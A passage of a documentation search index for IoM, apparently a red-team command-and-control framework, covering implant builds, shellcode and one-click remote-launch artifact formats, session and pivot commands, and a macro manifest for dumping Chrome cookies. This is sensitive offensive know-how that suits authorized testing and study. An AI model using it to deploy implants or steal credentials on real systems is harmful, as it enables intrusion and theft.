</ul>"},{"location":"IoM/manual/mal/rpc/#updatecertificate","title":"UpdateCertificate","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [TLS] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#updategithubconfig","title":"UpdateGithubConfig","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [GithubWorkflowConfig] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#updatenotifyconfig","title":"UpdateNotifyConfig","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Notify] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#updateprofile","title":"UpdateProfile","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Profile] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#upload","title":"Upload","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [UploadRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#uploadartifact","title":"UploadArtifact","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Artifact] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#waittaskcontent","title":"WaitTaskContent","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Task] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#waittaskfinish","title":"WaitTaskFinish","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Task] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#whoami","title":"Whoami","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#wmiexecute","title":"WmiExecute","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [WmiMethodRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#wmiquery","title":"WmiQuery","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [WmiQueryRequest] </li> </ul>"},{"location":"IoM/manual/manual/","title":"Internet of Malice \u00b7 manual","text":""},{"location":"IoM/manual/manual/#iom-\u624b\u518c","title":"IoM \u624b\u518c","text":""},{"location":"IoM/manual/manual/build/","title":"build","text":""},{"location":"IoM/manual/manual/build/#\u7f16\u8bd1\u914d\u7f6e","title":"\u7f16\u8bd1\u914d\u7f6e","text":""},{"location":"IoM/manual/manual/build/#\u4f7f\u7528saas\u7f16\u8bd1","title":"\u4f7f\u7528SaaS\u7f16\u8bd1","text":"<p>v0.1.1 \u52a0\u5165\u4e86SaaS\u7f16\u8bd1 \u8fd9\u662fIoM\u5b9e\u73b0\"\u5f00\u7bb1\u5373\u7528\"\u76ee\u6807\u7684\u91cd\u8981\u4e00\u6b65\u3002SaaS\u7f16\u8bd1\u670d\u52a1\u6258\u7ba1\u5728\u6211\u4eec\u7684\u670d\u52a1\u5668\u4e0a\uff0c\u4e3a\u7528\u6237\u63d0\u4f9b\u6700\u57fa\u7840\u7684\u81ea\u52a8\u5316\u7f16\u8bd1\u670d\u52a1\uff0c\u6781\u5927\u7b80\u5316\u4e86IoM\u7684\u4f7f\u7528\u95e8\u69db\u3002</p> <ul> <li>\u96f6\u73af\u5883\u914d\u7f6e\uff1a\u65e0\u9700\u5b89\u88c5Docker\u3001GitHub Action\u6216\u5176\u4ed6\u7f16\u8bd1\u73af\u5883</li> <li>\u81ea\u52a8\u6ce8\u518c\uff1a\u5982\u679ctoken\u4e3anull\uff0c\u4f1a\u81ea\u52a8\u5411\u670d\u52a1\u5668\u6ce8\u518c\u83b7\u53d6token\uff0c\u5bf9\u7528\u6237\u5b8c\u5168\u65e0\u611f</li> <li>\u5373\u65f6\u53ef\u7528\uff1a\u8fd0\u884cserver\u540e\u7b49\u5f85\u51e0\u5206\u949f\u5373\u53ef\u81ea\u52a8\u751f\u6210\u5bf9\u5e94\u7684implant</li> <li>\u5b89\u5168\u53ef\u63a7\uff1a\u5982\u6709\u5b89\u5168\u987e\u8651\uff0c\u53ef\u624b\u52a8\u5173\u95ed\u6b64\u529f\u80fd\uff0c\u4f7f\u7528\u79c1\u6709\u5316\u7f16\u8bd1\u65b9\u6848</li> </ul> <p>\u9ed8\u8ba4\u542f\u7528\uff1av0.1.1\u7248\u672c\u5f00\u59cb\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0bserver\u4f1a\u4f7f\u7528\u4e91\u7f16\u8bd1\u670d\u52a1\u751f\u6210implant\u3002</p> <p>\u5173\u95edSaaS\u7f16\u8bd1\uff1a\u5982\u9700\u4f7f\u7528\u79c1\u6709\u5316\u7f16\u8bd1\u65b9\u6848\uff0c\u53ef\u5728\u914d\u7f6e\u4e2d\u5173\u95ed\uff1a</p> <pre><code>saas:  \n  enable: false  \n</code></pre> <p>\u5b89\u5168\u8b66\u544a</p> <p>\u4f7f\u7528\u9ed8\u8ba4\u63d0\u4f9b\u7684\u4e91\u7f16\u8bd1\u670d\u52a1\u89c6\u4e3a\u540c\u610f\u7528\u6237\u534f\u8bae \u7528\u6237\u534f\u8bae\u5168\u6587: https://wiki.chainreactors.red/IoM/#_4</p> <p>\u5982\u6709\u5b89\u5168\u987e\u8651\uff0c\u5efa\u8bae\uff1a 1. \u5173\u95edSaaS\u7f16\u8bd1\u529f\u80fd 2. \u4f7f\u7528Docker\u6216GitHub Action\u8fdb\u884c\u79c1\u6709\u5316\u7f16\u8bd1 3. \u81ea\u884c\u642d\u5efa\u7f16\u8bd1\u73af\u5883</p> <p>SaaS\u7f16\u8bd1\u6781\u5927\u7b80\u5316\u4e86\u539f\u672c\u590d\u6742\u7684\u7f16\u8bd1\u6d41\u7a0b\uff0c\u65e0\u9700\u914d\u7f6edocker/githuba acticon\u5373\u53ef\u8fdb\u884c\u7f16\u8bd1\u3002\u4e3a\u4e86\u7b80\u5316clinet\u7f16\u8bd1\u6d41\u7a0b\uff0c\u6211\u4eec\u5c06\u539f\u5148\u7684docker\u3001github action\u7f16\u8bd1\u547d\u4ee4\u4e0eSaaS\u7f16\u8bd1\u7edf\u4e00\u5230\u4e86build\u547d\u4ee4\u4e2d\uff0c\u901a\u8fc7 <code>--source</code> \u63a7\u5236\u4f7f\u7528\u4e0d\u540c\u7684\u7f16\u8bd1\u65b9\u5f0f\u3002</p> <pre><code>build beacon --profile tcp_default --target x86_64-pc-windows-gnu --source saas\n</code></pre> <p></p> <p>\u5982\u679c\u4e0d\u6307\u5b9a <code>--source</code> \u5c06\u81ea\u52a8\u5bfb\u627e\u53ef\u7528\u7f16\u8bd1\u65b9\u5f0f</p>"},{"location":"IoM/manual/manual/build/#\u4f7f\u7528github-action","title":"\u4f7f\u7528github action","text":"<p>v0.0.4 \u5f00\u59cb\u63a8\u8350\u66f4\u52a0\u8f7b\u91cf\u7684github action\u7f16\u8bd1\uff0c \u5bf9\u670d\u52a1\u5668\u7684\u914d\u7f6e\u65e0\u8981\u6c42\uff0c\u4e5f\u4e0d\u9700\u8981\u5b89\u88c5docker</p> <p>\u65b0\u5efagithub token: https://github.com/settings/tokens/new </p> <p></p> <p>fork \u6216\u8005push\u5230\u81ea\u5df1\u7684malefic\u4ed3\u5e93</p> <p>\u4fee\u6539 /opt/IoM/malice-network/config.yaml(\u5373\u670d\u52a1\u7aefconfig.yaml)</p> <pre><code>github:  \n  repo: malefic  \n  workflow: generate.yaml  \n  owner: your_name\n  token: your_token\n</code></pre> <p>\u4fee\u6539 config \u540e\u91cd\u542f\u670d\u52a1</p> <pre><code>service malice-network restart\n</code></pre> <p>\u6216\u91cd\u542fmalice-network</p> <pre><code>./malice-network\n</code></pre> <p>\u5728 v0.0.4 \u4e0b\uff0c\u6211\u4eec\u5f15\u5165\u4e86 github action \u6765\u7f16\u8bd1 implant\uff0c\u907f\u514d\u56e0\u4e3a rust \u590d\u6742\u7684\u7f16\u8bd1\u65b9\u6848\u800c\u9700\u8981\u51c6\u5907 docker \u73af\u5883\u6765\u7f16\u8bd1\u3002\u73b0\u5728\u4f60\u53ea\u9700\u51c6\u5907\u597d malefic \u4ed3\u5e93\u548c\u5bf9\u5e94\u7684 token\uff08\u9700\u8981 workflow \u548c package \u6743\u9650\uff09\uff0c\u5e76\u4e14\u5728 sever \u6216\u8005 client \u7aef\u914d\u7f6e\uff08\u8be6\u89c1\u914d\u7f6e\u8bf4\u660e\uff09\uff0c\u5373\u53ef\u4f7f\u7528\u547d\u4ee4\u884c\u8fdb\u884c github action \u7f16\u8bd1\u3002</p> <p>\u4f7f\u7528 client \u81ea\u52a8\u7f16\u8bd1:</p> <p>\u7f16\u8bd1beacon</p> <p>\u57fa\u4e8egithub action <pre><code>build beacon --profile tcp_default --target x86_64-unknown-linux-musl --source action\n</code></pre></p> <p>\u591a\u6309 Tab, \u5927\u90e8\u5206\u8f93\u5165\u90fd\u53ef\u4ee5\u901a\u8fc7 tab \u81ea\u52a8\u8865\u5168</p> (\u975e\u5fc5\u8981)\u5176\u4ed6\u7f16\u8bd1\u65b9\u5f0f <p>\u6211\u4eec\u63d0\u4f9b\u4e86\u5982\u4e0b\u51e0\u79cd\u65b9\u5f0f\u8fdb\u884c\u7f16\u8bd1\uff1a</p> <ol> <li>\u672c\u5730\u7f16\u8bd1</li> <li>Docker \u7f16\u8bd1(\u7eaf\u672c\u5730\u66f4\u5b89\u5168)</li> <li>Github Action\u7f16\u8bd1\u73af\u5883(0\u73af\u5883\u914d\u7f6e, \u63a8\u8350)</li> </ol> <p>\u7f16\u8bd1\u5b8c\u6574\u8bf4\u660e\u624b\u518cimplant \u624b\u518c</p>"},{"location":"IoM/manual/manual/build/#\u4f7f\u7528docker-\u5bf9\u670d\u52a1\u5668\u6027\u80fd\u6709\u8981\u6c42","title":"\u4f7f\u7528docker (\u5bf9\u670d\u52a1\u5668\u6027\u80fd\u6709\u8981\u6c42)","text":"<p>\u5982\u679c\u5df2\u7ecf\u914d\u7f6e\u4e86github action, \u53ef\u4ee5\u5ffd\u7565docker\u76f8\u5173\u3002</p> <p>\u670d\u52a1\u5668\u6027\u80fd\u8981\u6c42</p> <p>\u81ea\u52a8\u5316\u7f16\u8bd1\u670d\u52a1\u7528\u5230\u4e86 docker, \u4e14 rust \u751f\u6210\u7684\u4e2d\u95f4\u6587\u4ef6\u4f53\u79ef\u8f83\u5927, \u5bf9 CPU \u6d88\u8017\u8f83\u9ad8.</p> <p>\u56e0\u6b64 IoM \u8981\u642d\u5efa\u81ea\u52a8\u5316\u7f16\u8bd1\u7684\u670d\u52a1\u7aef\u5bf9\u6027\u80fd\u6709\u4e00\u5b9a\u8981\u6c42.</p> <p>\u6211\u4eec\u63a8\u8350\u5728\u81f3\u5c112\u68384G\u6216\u4ee5\u4e0a\u7684\u673a\u5668\u8fd0\u884c, \u5e76\u4fdd\u7559\u81f3\u5c11 20G \u7684\u7a7a\u95f4.</p> <p>\u5982\u679c\u53ea\u662f\u4f5c\u4e3a server/listener \u7528\u9014, \u5bf9\u6027\u80fd\u6ca1\u6709\u4efb\u4f55\u8981\u6c42.</p> <p>\u53ef\u4ee5\u4e13\u95e8\u627e\u4e00\u53f0\u670d\u52a1\u5668\u5f53\u505a\u7f16\u8bd1\u670d\u52a1\u5668. \u540e\u7eed\u4e5f\u4f1a\u63d0\u4f9b\u8fd9\u65b9\u9762\u7684\u4f18\u5316.</p> <p>\u5982\u679c\u8981\u4f7f\u7528docker\u4f5c\u4e3a\u7f16\u8bd1\u73af\u5883\uff0c\u9700\u8981\u51c6\u5907\u4e00\u53f0\u6027\u80fd\u8fd8\u4e0d\u9519\u7684\u673a\u5668\uff0c \u5e76\u5728install.sh \u7684\u4ea4\u4e92\u5f0f\u5b89\u88c5\u5f15\u5bfc\u4e2d\u9009\u62e9docker.</p> <p>\u5b89\u88c5\u811a\u672c\u4e2d\u5df2\u7ecf\u81ea\u52a8\u5316\u914d\u7f6e\u4e86IoM\u5fc5\u5907\u7684\u6240\u6709\u73af\u5883\uff0c\u53ef\u4ee5\u5728client\u76f4\u63a5\u64cd\u4f5c</p> <p>\u82e5\u6ca1\u6709\u4f7f\u7528\u5b89\u88c5\u811a\u672c\uff0c\u5219\u9700\u8981\u624b\u52a8\u5b89\u88c5\u955c\u50cf  <code>ghcr.io/chainreactors/malefic-builder:latest</code> \uff0c\u8fd9\u4e2a\u955c\u50cf\u5305\u542b\u4e86win/linux/mac\u5e38\u7528target\u3002</p> \u57fa\u4e8edocker\u7684\u624b\u52a8\u7f16\u8bd1(\u975e\u5fc5\u8981) <p>docker \u624b\u52a8\u7f16\u8bd1\u64cd\u4f5c\u53ef\u89c1: https://chainreactors.github.io/wiki/IoM/manual/implant/build/#%21-docker-%E7%BC%96%E8%AF%91%E6%8E%A8%E8%8D%90</p> <p>\u76f8\u6bd4IoM\u76ee\u524d\u63d0\u4f9b\u7684\u53c2\u6570\u9009\u9879\uff0c \u624b\u52a8\u7f16\u8bd1\u5177\u6709\u66f4\u9ad8\u7684\u7ec6\u7c92\u5ea6\uff0c\u4f46\u53ea\u63a8\u8350\u5bf9rust\u5f00\u53d1\u719f\u6089\u7684\u4f7f\u7528</p> <pre><code>build beacon --profile tcp_default --target x86_64-pc-windows-gnu --source docker\n</code></pre> <p></p>"},{"location":"IoM/manual/manual/build/#\u7f16\u8bd1","title":"\u7f16\u8bd1","text":"<p>\u76ee\u524d\u6211\u4eec\u7cbe\u7b80\u4e86build\u547d\u4ee4\uff0c\u5e76\u652f\u6301\u4e09\u79cd\u7f16\u8bd1\u65b9\u5f0f\uff0c\u5206\u522b\u4e3adocker\u3001action\u548cSaaS\u7f16\u8bd1\u3002\u672c\u6587\u5c06\u4e3b\u8981\u4e3e\u4f8b\u5982\u4f55\u5728IoM\u73af\u5883\u4e0b\u8fdb\u884c\u7f16\u8bd1\u3002</p>"},{"location":"IoM/manual/manual/build/#\u51c6\u5907profile","title":"\u51c6\u5907profile","text":"<p>\u7f16\u8bd1Implant\u9700\u8981\u901a\u8fc7profile\u6765\u63a7\u5236\u7f16\u8bd1\u9009\u9879\uff0c\u6240\u4ee5\u5728\u7f16\u8bd1\u4e4b\u524d\u9996\u5148\u8981\u786e\u4fdd\u662f\u5426\u6709\u5bf9\u5e94\u7684\u7f16\u8bd1profile\u3002\u76ee\u524d\u5728\u9ed8\u8ba4\u7684server\u914d\u7f6e\u4e0b\uff0c\u6211\u4eec\u4f1a\u751f\u6210\u9ed8\u8ba4\u7684pipeline profile\uff0c\u8d1f\u8d23\u7f16\u8bd1\u4e0e\u5bf9\u5e94pipeline\u901a\u4fe1\u7684Implant\u3002</p> <p></p> <p>\u5728gui\u4e0a\uff0c\u53ef\u4ee5\u5728artifact\u9875\u9762\u67e5\u770bprofile\u5217\u8868: </p> <p>\u4e5f\u53ef\u4ee5\u70b9\u51fbprofile\u7684name\uff0c\u67e5\u770bprofile\u5185\u5bb9\uff1a  \u5982\u679c\u9700\u8981\u5efa\u7acb\u65b0\u7684profile\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4:</p> <pre><code>profile new --name test --pipeline tcp\n</code></pre> <p> \u4e5f\u53ef\u4ee5load\u4e00\u4e2a\u5df2\u6709\u7684profile\u6587\u4ef6: <pre><code>profile load path/to/config.yaml --name test --pipeline tcp\n</code></pre></p> <p></p> <p>\u5728 gui \u4e2d\u6dfb\u52a0 profile \u65f6\uff0c\u7528\u6237\u82e5\u672a\u9009\u62e9\u6587\u4ef6\u5219\u521b\u5efa\u65b0\u7684 profile\uff1b\u82e5\u9009\u62e9\u4e86\u5df2\u6709\u7684 profile \u6587\u4ef6\uff0c\u5219\u52a0\u8f7d\u8be5 profile: </p>"},{"location":"IoM/manual/manual/build/#\u7f16\u8bd1beacon","title":"\u7f16\u8bd1beacon","text":"<pre><code>build beacon --profile tcp_default --target x86_64-unknown-linux-musl\n</code></pre> <p> \u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>--rem</code> \uff0c\u5c06beacon\u9759\u6001\u94fe\u63a5\u81f3rem\u3002</p> <pre><code>build beacon --profile tcp_default --target x86_64-unknown-linux-musl --rem\n</code></pre> <p></p> <p></p> <p></p>"},{"location":"IoM/manual/manual/build/#\u7f16\u8bd1module","title":"\u7f16\u8bd1module","text":"<p>\u76ee\u524d\u6211\u4eec\u652f\u6301\u7f16\u8bd1IoM\u7684\u63d2\u4ef6\u548c\u7b2c\u4e09\u65b9\u63d2\u4ef6\uff0c\u4f7f\u7528\u65f6\u5fc5\u987b\u5e26\u4e0a <code>--modules</code> \u6216 <code>--3rd</code> \uff0c\u6765\u786e\u8ba4\u6240\u9700\u8981\u7f16\u8bd1\u7684\u63d2\u4ef6\uff0c\u5426\u5219\u5c06\u65e0\u6cd5\u7f16\u8bd1\u3002\u5728gui\u4e2d\uff0c3rd\u548cmodules\u53ea\u53ef\u4ee5\u5728\u4e00\u4e2a\u6587\u672c\u6846\u586b\u5165module\u3002\u7528\u6cd5\u5982\u4e0b\uff1a</p> <pre><code>build modules --modules execute_exe,execute_dll --profile tcp_default --target x86_64-pc-windows-gnu \n</code></pre> <p></p> <p></p> <p>\u901a\u8fc7artifact name\u52a0\u8f7dmodules\uff08name\u53ef\u901a\u8fc7tab\u8865\u5168\uff09\u3002</p> <pre><code>load_module --artifact artifact-name\n</code></pre> <p></p>"},{"location":"IoM/manual/manual/build/#\u7f16\u8bd1-3rd-module","title":"\u7f16\u8bd1 3<sup>rd</sup> module","text":"<p>\u76ee\u524d\u4ec5\u652f\u6301rem\u548ccurl\u3002</p> <pre><code>build modules --3rd rem --profile tcp_default --target x86_64-pc-windows-gnu\n</code></pre> <p></p> <p> \u540c\u4e0a\uff0c\u901a\u8fc7artifact name\u52a0\u8f7dmodules\u3002</p> <p></p> <p></p>"},{"location":"IoM/manual/manual/build/#\u7f16\u8bd1pulse","title":"\u7f16\u8bd1pulse","text":"<pre><code>build pulse --profile tcp_default --target x86_64-pc-windows-gnu \n</code></pre> <p>\u6307\u5b9abeacon\u8fdb\u884c\u7f16\u8bd1\u3002</p> <pre><code>build pulse --profile tcp_default --target x86_64-pc-windows-gnu --artifact-id 5\n</code></pre> <p></p> <p></p>"},{"location":"IoM/manual/manual/build/#\u7f16\u8bd1prelude","title":"\u7f16\u8bd1prelude","text":"<p>prelude\u76ee\u524d\u9700\u8981\u914d\u7f6eautorun.yaml\u6765\u4f7f\u7528\uff0cprofile\u4e2dimplants\u4e0b\u7684autorun\u9700\u8981\u6307\u5b9a\u4e3aautorun.yaml\uff1a</p> <pre><code>implants:  \n  runtime: tokio           \n  mod: beacon             \n  register_info: false      \n  hot_load: true          \n  modules:               \n    - \"full\"  \n  enable_3rd: false       \n  3rd_modules:             \n\n  autorun: \"autorun.yaml\"             # autorun config filename  \n  pack: \n  flags:  \n    start: 0x41  \n    end: 0x42  \n    magic: \"beautiful\"  \n    artifact_id: 0x1\n</code></pre> <p>autorun.yaml\u7684\u793a\u4f8bconfig\u4e3a\uff1a <pre><code>-\n  name: execute_bof          # \u9700\u8981\u6267\u884c\u7684\u547d\u4ee4\u540d\u79f0\n  body: !ExecuteBinary       # \u6307\u5b9a\u547d\u4ee4proto\u7c7b\u578b\n    name: dir                # \u547d\u4ee4\u6807\u8bc6\n    bin: !File \"dir.o\"       # \u8981\u6267\u884c\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\n</code></pre></p> <p>\u5728\u7f16\u8bd1prelude\u65f6\uff0c\u9700\u8981\u4f7f\u7528 <code>--autorun</code> \u5e26\u4e0aautorun.zip\u7684\u6587\u4ef6\u8def\u5f84\uff0c\u5c06autorun.zip\u4e0a\u4f20\u81f3\u670d\u52a1 \u5668\u3002autorun.zip\u7684\u6587\u4ef6\u76ee\u5f55\u5982\u4e0b\uff1a</p> <p></p> <p>resources\u6587\u4ef6\u5939\u4e2d\u9700\u8981\u5305\u542bautorun.yaml\u4e2d\u6240\u5217\u5230\u7684\u6240\u6709\u6587\u4ef6\u3002 \u7f16\u8bd1\u547d\u4ee4\u5982\u4e0b\uff1a <pre><code>build prelude  --profile prelude-profile  --target x86_64-pc-windows-gnu --autorun path/to/dir.zip\n</code></pre></p> <p></p> <p></p>"},{"location":"IoM/manual/manual/build/#\u67e5\u770bbuild-log","title":"\u67e5\u770bbuild log","text":"<p>\u5982\u679c\u51fa\u73b0\u7f16\u8bd1\u5931\u8d25\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u6765\u67e5\u770bbuild log(\u76ee\u524d\u652f\u6301\u67e5\u770bdocker\uff0c\u540e\u7eed\u4f1a\u52a0\u4e0asaas\uff09\uff1a</p> <pre><code>build log artifact_name\n</code></pre> <p></p> <p>\u5728gui\u4e2d\uff0c\u53ef\u4ee5\u53f3\u51fb\u5bf9\u5e94artifact\u884c\uff0c\u70b9\u51fbShow Artifact Log, \u53ef\u4ee5\u67e5\u770blog\u3002</p> <p></p>"},{"location":"IoM/manual/manual/build/#artifact","title":"artifact","text":"<p>\u5728artifact build \u5b8c\u6bd5\u540e\u4f1a\u6709\u5982\u4e0b\u65e5\u5fd7 </p> <p>\u73b0\u5728\u4f60\u53ef\u4ee5\u901a\u8fc7<code>artifact download</code>\u547d\u4ee4\u83b7\u53d6shellcode, <code>artifact download &lt;ArtifactName&gt; --format &lt;format&gt;</code></p> <p>format\u683c\u5f0f\u76ee\u524d\u6709:</p> <pre><code>executable\nraw\nc\ncsharp\njava\ngolang\npython\nperl\nruby\nbash\npowershell\nhex-oneline\nhex-multiline\nnum\ndword\njs_be\njs_le\nvbscript\nvbapplication\npowershell-remote *\ncurl-remote *\n</code></pre> <p></p> <p>\u56e0\u6b64\uff0c\u4f60\u53ef\u4ee5\u8c03\u7528<code>artifact download SLOW_ESTIMATE --format raw</code>\u6765\u83b7\u5f97\u4e00\u4e2ashellcode, \u76f4\u63a5\u7528\u4e8e\u6267\u884c </p> <p>\u53e6\u5916, \u76ee\u524d\u6211\u4eec\u652f\u6301\u4e86powershell-remote\u548ccurl-remote\u4e24\u79cd\u65b0\u683c\u5f0f\u7684\u7528\u6cd5,\u65b9\u4fbf\u4e00\u952e\u4e0a\u7ebf\u7b49\u64cd\u4f5c,\u901a\u8fc7\u524d\u6587\u65e5\u5fd7\u8bfb\u8005\u53ef\u4ee5\u89c2\u5bdf\u5230\u6211\u4eec\u5c06artifact\u53ca\u5176\u5bf9\u5e94\u7684format\u6620\u5c04\u5230\u4e86website\u7aef: \u5f53\u4f60\u8c03\u7528powershell-remote\u65f6, \u4f1a\u8f93\u51fa\u5bf9\u5e94\u7684\u4e00\u952e\u4e0a\u7ebf\u547d\u4ee4\u3002</p> <pre><code>artifact download &lt;ArtifactName&gt; --format powershell-remote`\n</code></pre> <p></p> <p>\u8bfb\u8005\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u6765\u6d4f\u89c8\u4ee5\u5f80\u7684artifact\u8bb0\u5f55\uff0c\u5e76\u4e14\u5728artifact\u8868\u683c\u4e2d\u9009\u4e2d\u540e\uff0c\u5373\u53ef\u5c06artifact\u6e90\u6587\u4ef6\u4e0b\u8f7d\u5230client\u7aef\u3002 <pre><code>artifact list\n</code></pre></p> <p></p> <p>gui\u5219\u662f\u5728artifact\u9875\u9762\u4e0a\u70b9\u51fb\u5bf9\u5e94\u7684artifact\u884c\u4e0a\u7684download\u6309\u94ae\uff0c\u5373\u53ef\u4e0b\u8f7dartifact\u6e90\u6587\u4ef6\u5230\u6307\u5b9a\u8def\u5f84\u3002 </p>"},{"location":"IoM/manual/manual/client/","title":"client usage","text":""},{"location":"IoM/manual/manual/client/#generic","title":"generic","text":""},{"location":"IoM/manual/manual/client/#_1","title":"!","text":"<p>Run a command</p> <pre><code>! [command]\n</code></pre>"},{"location":"IoM/manual/manual/client/#broadcast","title":"broadcast","text":"<p>Broadcast a message to all clients</p> <pre><code>broadcast [message] [flags]\n</code></pre> <p>Options</p> <pre><code>  -n, --notify   notify the message to third-party services\n</code></pre>"},{"location":"IoM/manual/manual/client/#exit","title":"exit","text":"<p>exit client</p> <pre><code>exit\n</code></pre>"},{"location":"IoM/manual/manual/client/#license","title":"license","text":"<p>show server license info</p> <p>Description</p> <p>show server license info</p> <pre><code>license\n</code></pre> <p>Examples</p> <pre><code>license\n</code></pre>"},{"location":"IoM/manual/manual/client/#login","title":"login","text":"<p>Login to server</p> <p></p> <pre><code>login\n</code></pre>"},{"location":"IoM/manual/manual/client/#pivot","title":"pivot","text":"<p>List all pivot agents</p> <p>Description</p> <p>List all active pivot agents with their details</p> <pre><code>pivot [flags]\n</code></pre> <p>Examples</p> <p>List all pivot agents: <pre><code>pivot\n</code></pre></p> <p>Options</p> <pre><code>  -a, --all   list all pivot agents\n</code></pre>"},{"location":"IoM/manual/manual/client/#version","title":"version","text":"<p>show server version</p> <pre><code>version\n</code></pre>"},{"location":"IoM/manual/manual/client/#manage","title":"manage","text":""},{"location":"IoM/manual/manual/client/#background","title":"background","text":"<p>back to root context</p> <p>Description</p> <p>Exit the current session and return to the root context.</p> <pre><code>background\n</code></pre>"},{"location":"IoM/manual/manual/client/#history","title":"history","text":"<p>show log history</p> <p>Description</p> <p>Displays the specified number of log lines of the current session.</p> <pre><code>history\n</code></pre>"},{"location":"IoM/manual/manual/client/#obverse","title":"obverse","text":"<p>observe manager</p> <p>Description</p> <p>Control observers to listen session in the background.</p> <pre><code>obverse [flags]\n</code></pre> <p>Examples</p> <pre><code>// List all observers\nobserve -l\n\n// Remove observer\nobserve -r\n</code></pre> <p>Options</p> <pre><code>  -l, --list     list all observers\n  -r, --remove   remove observer\n</code></pre>"},{"location":"IoM/manual/manual/client/#session","title":"session","text":"<p>List and Choice sessions</p> <p>Description</p> <p>Display a table of active sessions on the server,  allowing you to navigate up and down to select a desired session.  Press the Enter key to use the selected session.  Use the -a or --all option to display all sessions, including those that have been disconnected.</p> <pre><code>session [flags]\n</code></pre> <p>Examples</p> <pre><code>// List all active sessions\nsession\n\n// List all sessions, including those that have been disconnected\nsession -a\n\n// List all sessions, and shown in static table for mcp server\nsession -a --static\n</code></pre> <p>Options</p> <pre><code>  -a, --all      show all sessions\n      --static   show all sessions in static table\n</code></pre> <p>SEE ALSO</p> <ul> <li>session group    - group session</li> <li>session newbind    - new bind session</li> <li>session note  - add note to session</li> <li>session remove  - remove session</li> </ul>"},{"location":"IoM/manual/manual/client/#session-group","title":"session group","text":"<p>group session</p> <p>Description</p> <p>Add a session to a group. If the group does not exist, it will be created. When using an active session, only provide the group name.</p> <pre><code>session group [group] [session]\n</code></pre> <p>Examples</p> <pre><code>// Add a session to a group\ngroup newGroup 08d6c05a21512a79a1dfeb9d2a8f262f\n\n// Add a session to a group when using an active session\ngroup newGroup\n</code></pre> <p>SEE ALSO</p> <ul> <li>session    - List and Choice sessions</li> </ul>"},{"location":"IoM/manual/manual/client/#session-newbind","title":"session newbind","text":"<p>new bind session</p> <pre><code>session newbind [session] [flags]\n</code></pre> <p>Options</p> <pre><code>  -n, --name string       session name\n      --pipeline string   pipeline id\n  -t, --target string     session target\n</code></pre> <p>SEE ALSO</p> <ul> <li>session    - List and Choice sessions</li> </ul>"},{"location":"IoM/manual/manual/client/#session-note","title":"session note","text":"<p>add note to session</p> <p>Description</p> <p>Add a note to a session. If a note already exists, it will be updated.  When using an active session, only provide the new note.</p> <pre><code>session note [note] [session]\n</code></pre> <p>Examples</p> <pre><code>// Add a note to specified session\nnote newNote 08d6c05a21512a79a1dfeb9d2a8f262f\n\n// Add a note when using an active session\nnote newNote\n</code></pre> <p>SEE ALSO</p> <ul> <li>session    - List and Choice sessions</li> </ul>"},{"location":"IoM/manual/manual/client/#session-remove","title":"session remove","text":"<p>remove session</p> <p>Description</p> <p>Remove a specified session.</p> <pre><code>session remove [session]\n</code></pre> <p>Examples</p> <pre><code>// remove a specified session\nremove 08d6c05a21512a79a1dfeb9d2a8f262f\n</code></pre> <p>SEE ALSO</p> <ul> <li>session    - List and Choice sessions</li> </ul>"},{"location":"IoM/manual/manual/client/#use","title":"use","text":"<p>Use session</p> <p>Description</p> <p>use</p> <pre><code>use [session]\n</code></pre> <p>Examples</p> <pre><code>// use session\nuse 08d6c05a21512a79a1dfeb9d2a8f262f\n</code></pre>"},{"location":"IoM/manual/manual/client/#alias","title":"alias","text":"<p>manage aliases</p> <p>Description</p> <p>Macros are using the sideload or spawndll commands under the hood, depending on the use case. </p> <p>For Linux and Mac OS, the sideload command will be used. On Windows, it will depend on whether the macro file is a reflective DLL or not. </p> <p>Load a macro:  <pre><code>load /tmp/chrome-dump \n</code></pre></p> <p>Sliver macros have the following structure (example for the chrome-dump macro): </p> <p>chrome-dump  * chrome-dump.dll  * chrome-dump.so  * manifest.json</p> <p>It is a directory containing any number of files, with a mandatory manifest.json, that has the following structure: </p> <pre><code>{ \n    \"macroName\":\"chrome-dump\", // name of the macro, can be anything\n    \"macroCommands\":[ \n        { \n            \"name\":\"chrome-dump\", // name of the command available in the sliver client (no space)\n            \"entrypoint\":\"ChromeDump\", // entrypoint of the shared library to execute\n            \"help\":\"Dump Google Chrome cookies\", // short help message\n            \"allowArgs\":false, // make it true if the commands require arguments\n            \"defaultArgs\": \"test\", // if you need to pass a default argument\n            \"extFiles\":[ // list of files, groupped per target OS\n                { \n                    \"os\":\"windows\", // Target OS for the following files. Values can be \"windows\", \"linux\" or \"darwin\" \n                    \"files\":{ \n                        \"x64\":\"chrome-dump.dll\", \n                        \"x86\":\"chrome-dump.x86.dll\" // only x86 and x64 arch are supported, path is relative to the macro directory\n                    } \n                }, \n                {\n                    \"os\":\"linux\", \n                    \"files\":{\n                        